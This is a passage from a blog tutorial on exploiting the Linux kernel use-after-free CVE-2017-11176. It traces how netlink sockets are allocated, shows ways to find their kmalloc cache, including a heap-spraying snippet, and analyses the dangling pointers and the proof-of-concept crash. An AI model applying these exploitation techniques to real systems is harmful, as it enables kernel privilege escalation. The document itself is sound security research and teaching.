</code></pre></div><p>When <strong>netlink_create()</strong> is invoked, a <em>struct socket</em> has already been allocated. Its purpose is to allocate the <em>struct netlink_sock</em>, associate it to the socket and initialize both <em>struct socket</em> and <em>struct netlink_sock</em> fields. This is also where it does some sanity checks on the socket type (RAW, DGRAM) and the netlink's protocol identifier (NETLINK_USERSOCK, ...).</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_create</span><span class="p">(</span><span class="k">struct</span> <span class="nc">net</span><span class="w"> </span><span class="o">*</span><span class="n">net</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">protocol</span><span class="p">,</span><span class="w"></span>
<span class="w">              </span><span class="kt">int</span><span class="w"> </span><span class="n">kern</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">module</span><span class="w"> </span><span class="o">*</span><span class="n">module</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">mutex</span><span class="w"> </span><span class="o">*</span><span class="n">cb_mutex</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SS_UNCONNECTED</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">type</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">SOCK_RAW</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">type</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">ESOCKTNOSUPPORT</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">protocol</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">MAX_LINKS</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EPROTONOSUPPORT</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut (load the module if protocol is not registered yet - lazy loading) ...</span>

<span class="w">    </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__netlink_create</span><span class="p">(</span><span class="n">net</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">cb_mutex</span><span class="p">,</span><span class="w"> </span><span class="n">protocol</span><span class="p">,</span><span class="w"> </span><span class="n">kern</span><span class="p">);</span><span class="w">    </span><span class="c1">// &lt;-----</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">out_module</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>In turn, <strong>__netlink_create()</strong> is the "heart" of <em>struct netlink_sock</em> creation.</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">__netlink_create</span><span class="p">(</span><span class="k">struct</span> <span class="nc">net</span><span class="w"> </span><span class="o">*</span><span class="n">net</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"></span>
<span class="w">                </span><span class="k">struct</span> <span class="nc">mutex</span><span class="w"> </span><span class="o">*</span><span class="n">cb_mutex</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">protocol</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">kern</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">     </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">netlink_ops</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sk_alloc</span><span class="p">(</span><span class="n">net</span><span class="p">,</span><span class="w"> </span><span class="n">PF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">GFP_KERNEL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">netlink_proto</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">sk</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">     </span><span class="n">sock_init_data</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">sk</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut (mutex stuff) ...</span>

<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">     </span><span class="n">init_waitqueue_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">wait</span><span class="p">);</span><span class="w"></span>

<span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w">     </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_destruct</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_sock_destruct</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_protocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">protocol</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>The __netlink_create() function does:</p><ul><li>[0] - set the socket's proto_ops VFT to <strong>netlink_ops</strong></li><li>[1] - <strong>allocate a netlink_sock using <em>prot-&gt;slab</em> and <em>prot-&gt;obj_size</em> information</strong></li><li>[2] - initialize the sock's receive/send buffer, <em>sk_rcvbuf/sk_sndbuf</em> variables, bind the socket to the sock, etc.</li><li>[3] - initialize the wait queue (cf. <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">part 2</a>)</li><li>[4] - define a <em>specialized</em> destructor that will be called while freeing a <em>struct netlink_sock</em> (cf. previous section)</li></ul><p>Finally, <em>sk_alloc()</em> calls <strong>sk_prot_alloc()</strong> [1] using the <em>struct proto</em> (i.e. <em>netlink_proto</em>). <strong>This is where the kernel uses a <em>dedicated</em> or a <em>general</em> kmem_cache for allocation</strong>:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk_prot_alloc</span><span class="p">(</span><span class="k">struct</span> <span class="nc">proto</span><span class="w"> </span><span class="o">*</span><span class="n">prot</span><span class="p">,</span><span class="w"> </span><span class="n">gfp_t</span><span class="w"> </span><span class="n">priority</span><span class="p">,</span><span class="w"></span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">family</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">kmem_cache</span><span class="w"> </span><span class="o">*</span><span class="n">slab</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">slab</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prot</span><span class="o">-&gt;</span><span class="n">slab</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">slab</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kmem_cache_alloc</span><span class="p">(</span><span class="n">slab</span><span class="p">,</span><span class="w"> </span><span class="n">priority</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">~</span><span class="n">__GFP_ZERO</span><span class="p">);</span><span class="w">      </span><span class="c1">// &lt;-----</span>

<span class="w">    </span><span class="c1">// ... cut (zeroing the freshly allocated object) ...</span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">else</span><span class="w"></span>
<span class="w">        </span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kmalloc</span><span class="p">(</span><span class="n">sk_alloc_size</span><span class="p">(</span><span class="n">prot</span><span class="o">-&gt;</span><span class="n">obj_size</span><span class="p">),</span><span class="w"> </span><span class="n">priority</span><span class="p">);</span><span class="w">    </span><span class="c1">// &lt;-----</span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>As we've seen during netlink "protocol registration", it does not use any slab (i.e. <em>slab</em> is NULL), so it will call <strong>kmalloc()</strong> (i.e. general purpose cache).</p><p>Finally, we need to establish the call trace to <em>netlink_create()</em>. As one might wonder, the entry point is the <strong>socket()</strong> syscall. We won't unroll all the path (this is a good exercice though). Here is the result:</p><div class="highlight"><pre><span></span><code>- SYSCALL(socket)
- sock_create
- __sock_create // allocates a "struct socket"
- pf-&gt;create    // pf == netlink_family_ops
- netlink_create
- __netlink_create
- sk_alloc
- sk_prot_alloc
- kmalloc
</code></pre></div><p>Alright, we know where the <em>netlink_sock</em> is allocated and the type of <em>kmem_cache</em> (general purpose cache), but we still don't know which <em>kmem_cache</em> exactly (kmalloc-32? kmalloc-64?).</p><h2 id="detecting-the-object-size-staticallydynamically">Detecting the object size statically/dynamically</h2><p>In the previous section, we've seen that the netlink_sock object is allocated from a <em>general purpose kmem_cache</em> with:</p><div class="highlight"><pre><span></span><code><span class="n">kmalloc</span><span class="p">(</span><span class="n">sk_alloc_size</span><span class="p">(</span><span class="n">prot</span><span class="o">-&gt;</span><span class="n">obj_size</span><span class="p">),</span><span class="w"> </span><span class="n">priority</span><span class="p">)</span><span class="w"></span>
</code></pre></div><p>Where <strong>sk_alloc_size()</strong> is:</p><div class="highlight"><pre><span></span><code><span class="cp">#define SOCK_EXTENDED_SIZE ALIGN(sizeof(struct sock_extended), sizeof(long))</span>

<span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sk_alloc_size</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">prot_sock_size</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ALIGN</span><span class="p">(</span><span class="n">prot_sock_size</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">SOCK_EXTENDED_SIZE</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p><strong>NOTE</strong>: The <em>struct sock_extended</em> structure has been created to extend the original <em>struct sock</em> without breaking the kernel ABI. This is not required to understand this, we just need to remember that its size is added to prior allocation.</p><p>That is: <strong>sizeof(struct netlink_sock) + sizeof(struct sock_extended) + SOME_ALIGNMENT_BYTES</strong>.</p><p>It is important to remind that we do not actually need the <em>exact</em> size. Since we are allocating in a general purpose kmem_cache, we just need to find the "upper bounded" cache that can store our object (cf. Core Concept #3).</p><p><strong>WARNING-1</strong>: In "Core Concept #3", it has been told that the general kmemcaches have power-of-two sizes. This is not entirely true. Some systems have other sizes like "kmalloc-96" and "kmalloc-192". The rationale is that lots of objects are closer to these sizes than a power-of-two. Having such caches reduces <em>internal fragmentation</em>.</p><p><strong>WARNING-2</strong>: Using "debug only" methods can be a good starting point to get a rough idea of the target object size. However, <strong>those sizes will be wrong on the production kernel</strong> because of CONFIG_* preprocessors. It can vary from some bytes to hundreds of bytes! Also, you should pay a special attention if the computed object size is close to a <em>kmem_cache</em>'s object size boundary. For instance, a 260 bytes object will be in the kmalloc-512 but might be reduced to 220 bytes on production (hence kmalloc-256, that would be painful).</p><p>Using the Method #5 (see below), <strong>we found that our target size is "kmalloc-1024"</strong>. This is a nice cache to exploit <em>use-after-free</em>, you will see why in the reallocation section :-).</p><p><strong><em>Method #1 [static]: Manual Computation</em></strong></p><p>The idea is to sum each field's size "by hand" (knowing a int is 4 byte, a long is 8 bytes, etc.). This method works great for "small" structures but is <strong>very error prone</strong> for the bigger ones. One must take care of <strong>alignment, padding and packing</strong>. For instance:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">__wait_queue</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span><span class="w">           </span><span class="c1">// offset=0, total_size=4</span>
<span class="w">                                  </span><span class="c1">// offset=4, total_size=8 &lt;---- PADDING HERE TO ALIGN ON 8 BYTES</span>
<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">private</span><span class="p">;</span><span class="w">                </span><span class="c1">// offset=8, total_size=16</span>
<span class="w">    </span><span class="n">wait_queue_func_t</span><span class="w"> </span><span class="n">func</span><span class="p">;</span><span class="w">       </span><span class="c1">// offset=16, total_size=24</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="n">task_list</span><span class="p">;</span><span class="w">   </span><span class="c1">// offset=24, total_size=40 (sizeof(list_head)==16)</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>This was an easy one. Now, look at <strong>struct sock</strong> and do it... good luck! This is even more error prone, since you need to consider every <strong>CONFIG_</strong> pre-processor macros and handle complex "union".</p><p><strong><em>Method #2 [static]: With 'pahole' (debug only)</em></strong></p><p><a href="https://github.com/froydnj/pahole">pahole</a> is a great tool to achieve this. It does the tedious previous task <em>automatically</em>. For instance, to dump the layout of <em>struct socket</em>:</p><div class="highlight"><pre><span></span><code>$ pahole -C socket vmlinuz_dwarf
struct socket <span class="o">{</span>
        socket_state               state<span class="p">;</span>                /*     <span class="m">0</span>     <span class="m">4</span> */
        short int                  type<span class="p">;</span>                 /*     <span class="m">4</span>     <span class="m">2</span> */

        /* XXX <span class="m">2</span> bytes hole, try to pack */

        long unsigned int          flags<span class="p">;</span>                /*     <span class="m">8</span>     <span class="m">8</span> */
        struct socket_wq *         wq<span class="p">;</span>                   /*    <span class="m">16</span>     <span class="m">8</span> */
        struct file *              file<span class="p">;</span>                 /*    <span class="m">24</span>     <span class="m">8</span> */
        struct sock *              sk<span class="p">;</span>                   /*    <span class="m">32</span>     <span class="m">8</span> */
        const struct proto_ops  *  ops<span class="p">;</span>                  /*    <span class="m">40</span>     <span class="m">8</span> */

        /* size: <span class="m">48</span>, cachelines: <span class="m">1</span>, members: <span class="m">7</span> */
        /* sum members: <span class="m">46</span>, holes: <span class="m">1</span>, sum holes: <span class="m">2</span> */
        /* last cacheline: <span class="m">48</span> bytes */
<span class="o">}</span><span class="p">;</span>
</code></pre></div><p>It sounds like the perfect tool for our task. However, it requires that the kernel image has the <a href="https://en.wikipedia.org/wiki/DWARF">DWARF</a> symbols. Which won't be the case for production kernel.</p><p><strong><em>Method #3 [static]: With Disassemblers</em></strong></p><p>Well, you cannot exactly get the size given to <em>kmalloc()</em> since it is computed dynamically. However, you might try to <strong>look for offset</strong> used in those structures (especially the last fields) and then complete with manual computation. We will actually use this later...</p><p><strong><em>Method #4 [dynamic]: With System Tap (debug only)</em></strong></p><p>In <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">part 1</a> we saw how to use Sytem Tap's Guru mode to write code <em>inside</em> the kernel (i.e. a LKM). We can re-use it here and just "replay" the <em>sk_alloc_size()</em> function. Note that you may not be able to call <em>sk_alloc_size()</em> directly because it has been inlined. However, you can just copy/past its code and dump it.</p><p>Another way would be to probe the <em>kmalloc()</em> invokation during a <em>socket()</em> syscall. Chances are multiples <em>kmalloc()</em> will occur, so how to know which is the right one? You can <em>close()</em> the socket you've just created, probe <em>kfree()</em> and then try to match the pointers with the ones in <em>kmalloc()</em>. Since the first argument of <em>kmalloc()</em> is the size, you will find the correct one.</p><p>Alternatively, you can use the <strong>print_backtrace()</strong> function from a kmalloc(). Beware! System Tap discards messages if there is too much output!</p><p><strong><em>Method #5 [dynamic]: With "/proc/slabinfo"</em></strong></p><p>This looks like the <em>poor man</em> method but it actually works great! If you kmem_cache uses a dedicated cache, then you directly have the object size in the "objsize" column given you know the kmem_cache's name (cf. struct proto)!</p><p>Otherwise, the idea is to implement a simple program which allocates lots of your target object. For instance:</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="c1">// allocate by chunks of 200 objects</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">200</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="n">_socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_USERSOCK</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">getchar</span><span class="p">();</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p><strong>NOTE</strong>: What we do here is actually <strong>heap spraying</strong>.</p><p>In another window, run:</p><div class="highlight"><pre><span></span><code>watch -n <span class="m">0</span>.1 <span class="s1">'sudo cat /proc/slabinfo | egrep "kmalloc-|size-" | grep -vi dma'</span>
</code></pre></div><p>Then run the program, and type a key to provoke the next "allocation chunk". After some time, you will see that one general purpose cache "active_objs/num_objs" is growing and growing. This is our target <em>kmem_cache</em>!</p><h2 id="summary">Summary</h2><p>Alright, it has been a long way to gather all this information. However, it was necessary and allowed us to get a better understanding of the network protocol API. I hope you now understand why <a href="https://www.kernel.org/doc/html/v4.14/dev-tools/kasan.html">KASAN</a> is awesome. It does all this job for you (and more)!</p><p>Let's summarize this:</p><ul><li>What is the allocator? <strong>SLAB</strong></li><li>What is the object? <strong>struct netlink_sock</strong></li><li>What cache does it belong to? <strong>kmalloc-1024</strong></li><li>Where is it allocated?</li></ul><div class="highlight"><pre><span></span><code>- SYSCALL(socket)
- sock_create
- __sock_create // allocates a "struct socket"
- pf-&gt;create    // pf == netlink_family_ops
- netlink_create
- __netlink_create
- sk_alloc
- sk_prot_alloc
- kmalloc
</code></pre></div><ul><li>Where is it freed?</li></ul><div class="highlight"><pre><span></span><code>- &lt;&lt;&lt; what ever calls sock_put() on a netlink_sock (e.g. netlink_detachskb()) &gt;&gt;&gt;
- sock_put
- sk_free
- __sk_free
- sk_prot_free
- kfree
</code></pre></div><p>There is one last thing to analyze, and this is the "how" (read/write? bad deref? how many bytes?). It will be covered in the next section.</p><hr><h1 id="analyze-the-uaf-dangling-pointers">Analyze the UAF (dangling pointers)</h1><p><em>Let's get back to our bug!</em></p><p>In this section, we will identify our <em>UAF dangling pointers</em>, why the current <em>proof-of-concept</em> code (<a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">part 2</a>) crashes and why we are already doing a <em>"UAF transfer"</em> (this is not an "official" term) that is beneficial to us.</p><h2 id="identify-the-dangling-pointers">Identify the dangling pointers</h2><p>Right now, the kernel <em>brutally</em> crashes without having the opportunity to get any error from <strong>dmesg</strong>. So, we don't have any call trace to understand what is going on. The only sure thing is that it <em>constantly</em> crashes when we hit a key, never before. Of course, this is intended! We actually <em>already</em> did a <strong>UAF transfer</strong>. Let's explain it.</p><p>During the exploit initialization, we do:</p><ul><li>Create a NETLINK socket</li><li>Bind it</li><li>Fill its receive buffer</li><li>Dup it (twice)</li></ul><p>That is, we are in the current situation:</p><div class="highlight"><pre><span></span><code>file cnt  | sock cnt  | fdt[3]    | fdt[4]    | fdt[5]    | file_ptr-&gt;private_data | socket_ptr-&gt;sk |
----------+-----------+-----------+-----------+-----------+------------------------+----------------+
3         | 2         | file_ptr  | file_ptr  | file_ptr  | socket_ptr             | sock_ptr       |
</code></pre></div><p>Note the difference between <strong>socket_ptr</strong> (struct socket) and <strong>sock_ptr</strong> (struct netlink_sock).</p><p>Let's assume that:</p><ul><li>fd=3 is "sock_fd"</li><li>fd=4 is "unblock_fd"</li><li>fd=5 is "sock_fd2"</li></ul><p>The <em>struct file</em> associated to our netlink socket has a ref counter of <strong>three</strong> because of 1 socket() and 2 dup(). In turn, the sock refcounter is <strong>two</strong> because of 1 socket() and 1 bind().</p><p>Now, let's consider that we trigger the bug once. As we know, the sock's refcounter will be decreased by one, the file's refcounter decreased by one and the <em>fdt[5]</em> entry becomes NULL. Note that calling <strong>close(5)</strong> did not decrease the sock refcounter by one (the bug did it)!</p><p>The situation becomes:</p><div class="highlight"><pre><span></span><code>file cnt  | sock cnt  | fdt[3]    | fdt[4]    | fdt[5]    | file_ptr-&gt;private_data | socket_ptr-&gt;sk |
----------+-----------+-----------+-----------+-----------+------------------------+----------------+
2         | 1         | file_ptr  | file_ptr  | NULL      | socket_ptr             | sock_ptr       |
</code></pre></div><p>Let's trigger the bug a second time:</p><div class="highlight"><pre><span></span><code>file cnt  | sock cnt  | fdt[3]    | fdt[4]    | fdt[5]    | file_ptr-&gt;private_data | socket_ptr-&gt;sk      |
----------+-----------+-----------+-----------+-----------+------------------------+---------------------+
1         | FREE      | NULL      | file_ptr  | NULL      | socket_ptr             | (DANGLING) sock_ptr |
</code></pre></div><p>Again, close(3) did not drop a reference of the sock, the bug did it! Because the refcounter reaches zero, the sock is freed.</p><p>As we can see, the <em>struct file</em> is still alive since the file descriptor 4 is pointing on it. Moreover, <strong>the <em>struct socket</em> now has a <em>dangling pointer</em> on the just-freed sock object</strong>. This is the aforementioned UAF transfer. Unlike the first scenario (cf. part 1), where the "sock" variable was the dangling pointer (in <em>mq_notify()</em>), now it is the "sk" pointer of the <em>struct socket</em>. In other words, we have "access" to the socket's dangling pointer through the <em>struct file</em> through the <em>unblock_fd</em> file descriptor.</p><p>You might wonder why "the struct socket" still has a dangling pointer? The reason is, when the <em>netlink_sock</em> object is free with <strong>__sk_free()</strong>, it does (cf. previous section):</p><ol><li>Call the sock's destructor (i.e. <em>netlink_sock_destruct()</em>)</li><li>Cals sk_prot_free()</li></ol><p><strong>NONE OF THEM ACTUALLY UPDATE THE "SOCKET" STRUCTURE!</strong></p><p>If you look at <strong>dmesg</strong> before pressing a key (in the exploit), you will find a similar message:</p><div class="highlight"><pre><span></span><code>[  141.771253] Freeing alive netlink socket ffff88001ab88000
</code></pre></div><p>It comes from the sock's destructor <strong>netlink_sock_destruct()</strong> (called by __sk_free()):</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_sock_destruct</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">sock_flag</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DEAD</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">printk</span><span class="p">(</span><span class="n">KERN_ERR</span><span class="w"> </span><span class="s">"Freeing alive netlink socket %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">sk</span><span class="p">);</span><span class="w"> </span><span class="c1">// &lt;-----</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p><em>Alright, we identified one dangling pointer... guess what... there are more!</em></p><p>While binding the target socket with <em>netlink_bind()</em>, we saw that the reference counter has been increased by one. That's why we can reference it with <em>netlink_getsockbypid()</em>. Without detailing much, <em>netlink_sock</em> pointers are stored inside the <strong>nl_table</strong>'s hash list (this is covered in part 4). While destroying the sock object, these pointers also became dangling pointers.</p><p>It is important to identify <strong>every</strong> dangling pointer for two reasons:</p><ol><li>We can use them to exploit the <em>use-after-free</em>, they give us the <em>UAF primitives</em></li><li>We will need to fix them during kernel reparation</li></ol><p>Let's move on and understand why the kernel is crashing during the exit.</p><h2 id="understand-the-crash">Understand The Crash</h2><p>In the previous section, we identified three dangling pointers:</p><ul><li>the <strong>sk</strong> pointer in the <em>struct socket</em></li><li>two <em>netlink_sock</em> pointers inside the <strong>nl_table hash list</strong></li></ul><p>It is time to understand why the PoC crashes.</p><p>What happens when we press a key in the proof-of-concept code? The exploit simply exits, but this means a lot. The kernel needs to release every resources allocated to the process, otherwise that would be lots of memory leak.</p><p>The exit procedure itself is a bit complexe it mostly starts in the <strong>do_exit()</strong> function. At some point, it wants to release the file-related resources. This roughly does:</p><ol><li>Function <strong>do_exit()</strong> is invoked ([kernel/exit.c])</li><li>It calls <strong>exit_files()</strong> which releases a reference of current's <em>struct files_struct</em> with <strong>put_files_struct()</strong></li><li>Because it was the last reference, <em>put_files_struct()</em> calls <strong>close_files()</strong></li><li><em>close_files()</em> iterates over the FDT and calls <strong>filp_close()</strong> for every remaining file</li><li><em>filp_close()</em> calls <strong>fput()</strong> on the file pointed by <em>"unblock_fd"</em></li><li>Because it was the last reference, <strong>__fput()</strong> is invoked</li><li>Finally, <em>__fput()</em> calls the file operation <strong>file-&gt;f_op-&gt;release()</strong> which is <strong>sock_close()</strong></li><li><em>sock_close()</em> calls <em>sock-&gt;ops-&gt;release()</em> (proto_ops: <em>netlink_release()</em>) and set <em>sock-&gt;file</em> to NULL</li><li>From <em>netlink_release()</em>, there is "a tons of use-after-free operations" which result in a crash</li></ol><p>To keep it simple, because we did not close the <strong>unblock_fd</strong> it will be released when the program exits. In the end, <strong>netlink_release()</strong> will be invoked. From here, there are just <em>too much</em> UAF that it would be very lucky if it does not crash:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_release</span><span class="p">(</span><span class="k">struct</span> <span 